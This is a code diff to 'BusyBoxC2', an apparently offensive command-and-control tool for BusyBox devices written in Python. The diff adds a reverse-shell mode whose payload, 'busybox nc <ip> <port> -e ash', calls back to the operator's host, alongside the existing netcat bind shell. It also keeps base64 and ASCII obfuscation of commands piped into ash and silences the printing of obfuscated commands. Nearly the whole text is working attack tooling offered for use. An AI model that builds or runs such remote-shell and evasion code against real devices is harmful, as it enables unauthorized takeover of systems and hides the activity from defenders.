@@ -19,24 +19,34 @@ class BusyBoxC2:
         self.prompt_history = FileHistory(".prompt_history")
         self.prompt_session = PromptSession(history=self.prompt_history)
         self.options = []
+        self.stop_evt = threading.Event()
 
         # Show banner
         self._show_banner()
 
         # Show payload to send
-        payload = "busybox nc -lp " + str(server_port) + " -e ash"
+        match self.c2_type:
+            case 'bind_tcp': payload = "busybox nc -lp " + str(server_port) + " -e ash"
+            case 'reverse_tcp': payload = "busybox nc " + server_ip + " " + str(server_port) + " -e ash"
+            case _: exit(-1)
         print(f"[*] Payload to execute: {payload}\n")
 
         # Init socket
         self.socket = self._init_socket()
+
+        # Start socket monitoring
+        self.monitor_interval = 0.5
+        t = threading.Thread(target=self._socket_monitor, daemon=True)
+        t.start()
 
     def _show_banner(self):
         print(Figlet(font="slant").renderText("BusyBox C2"))
 
     def _init_socket(self):
         match self.c2_type:
-            case 'bind':
+            case 'bind_tcp':
                 print(f"[...] Initialization of TCP connection to {self.server_ip}:{self.server_port}")
+                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 while True:
                     try:
                         self.socket = socket.create_connection((self.server_ip, self.server_port))
@@ -46,7 +56,7 @@ class BusyBoxC2:
                         exit(0)
                     except:
                         pass
-            case 'reverse':
+            case 'reverse_tcp':
                 print(f"[...] Initialization of TCP listener on {self.server_ip}:{self.server_port}")
                 self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 self.socket.bind((self.server_ip, self.server_port))
@@ -59,6 +69,30 @@ class BusyBoxC2:
 
         self.socket.setblocking(False)
         return self.socket
+
+    def _socket_monitor(self):
+        interval = getattr(self, "monitor_interval", 0.5)
+        while not self.stop_evt.is_set():
+            try:
+                err = self.socket.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR)
+                if err:
+                    print(f"\n[!] Socket error: {os.strerror(err)}")
+                    break
+                r, _, _ = select.select([self.socket], [], [], interval)
+                if r:
+                    try:
+                        peek = self.socket.recv(1, socket.MSG_PEEK)
+                        if not peek:
+                            print("\n[!] Socket closed by peer")
+                            break
+                    except (BlockingIOError, InterruptedError):
+                        pass
+                    except OSError as e:
+                        print(f"\n[!] Socket read error: {e}")
+                        break
+            except (OSError, ValueError) as e:
+                print(f"\n[!] Socket check failed: {e}")
+                break
 
     def _send_cmd(self, cmd, output=True):
 
@@ -74,10 +108,10 @@ class BusyBoxC2:
         # Obfuscate full cmd if necessary
         if "obfuscation_ascii" in self.options:
             full_cmd = self._cmd_obfuscation_ascii(full_cmd)
-            print(f"Executed command: {full_cmd}\n")
+            #print(f"Executed command: {full_cmd}\n")
         if "obfuscation_base64" in self.options:
             full_cmd = self._cmd_obfuscation_b64(full_cmd)
-            print(f"Executed command: {full_cmd}\n")
+            #print(f"Executed command: {full_cmd}\n")
 
         # Send payload and wait marker in response to stop reading socket
         self.socket.sendall((full_cmd + "\n").encode())
@@ -113,8 +147,8 @@ class BusyBoxC2:
 
     def _cmd_obfuscation_b64(self, raw_cmd):
         cmd_to_get_cmd_b64_version = 'printf ' + '"' + raw_cmd + '"' + ' | busybox uuencode -m - | sed -n "2p"'
-        ascii_cmd = subprocess.check_output(cmd_to_get_cmd_b64_version, shell=True, text=True)
-        payload = "s=\"" + ascii_cmd.rstrip("\n").replace("`", "\`").replace("\"", "\\\"") + "\";printf 'begin-base64 644 -\\n%s\\n`\\n====\\n' $s|busybox uudecode |ash"
+        b64_cmd = subprocess.check_output(cmd_to_get_cmd_b64_version, shell=True, text=True)
+        payload = "s=\"" + self.sanitize_ash_var(b64_cmd) + "\";printf 'begin-base64 644 -\\n%s\\n`\\n====\\n' $s|busybox uudecode|ash"
         return payload
     
     def _cmd_obfuscation_ascii(self, raw_cmd):
@@ -197,8 +231,11 @@ class BusyBoxC2:
 
     def _load_prompt(self):
         agent_user = self._send_cmd("echo $USER", output=False)[0].decode().split("\n", 1)[0]
+        #print(agent_user)
         agent_hostname = self._send_cmd("hostname", output=False)[0].decode().split("\n", 1)[0]
-        agent_pwd = self._send_cmd("echo $PWD", output=False)[0].decode().split("\n", 1)[0]
+        #print(agent_hostname)
+        agent_pwd = self._send_cmd("pwd", output=False)[0].decode().split("\n", 1)[0]
+        #print(agent_pwd)
         
         self.prompt = " (busybox-c2)[+] " + agent_user +  "@" + agent_hostname + ":" + agent_pwd + "> "
 
@@ -219,10 +256,10 @@ class BusyBoxC2:
                                 print(f"{option} ")
                         case '/obfuscation_ascii' | '/obf_a':
                             self.options.append('obfuscation_ascii')
-                            self.prompt = " (busybox-c2)[+]> "
+                            if not "load_prompt" in self.options: self.prompt = " (busybox-c2)[+]> "
                         case '/obfuscation_base64' | '/obf_b64':
                             self.options.append('obfuscation_base64')
-                            self.prompt = " (busybox-c2)[+]> "
+                            if not "load_prompt" in self.options: self.prompt = " (busybox-c2)[+]> "
                         case '/scan_discover':
                             self._discover_arp_scan()
                         case '/download':
